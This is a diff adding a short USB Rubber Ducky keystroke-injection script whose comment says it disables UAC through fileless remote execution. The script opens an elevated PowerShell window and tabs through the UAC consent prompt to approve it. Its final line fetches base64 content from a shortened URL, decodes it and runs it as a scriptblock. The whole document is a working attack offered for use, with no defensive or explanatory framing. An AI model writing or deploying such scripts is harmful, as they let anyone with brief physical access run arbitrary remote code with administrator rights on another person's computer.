@@ -1,0 +1,16 @@
+REM This Ducky Script disables UAC using fileless remote execution
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 1000
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+STRING &([scriptblock]::Create([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((irm t.ly/cxcHN)))))
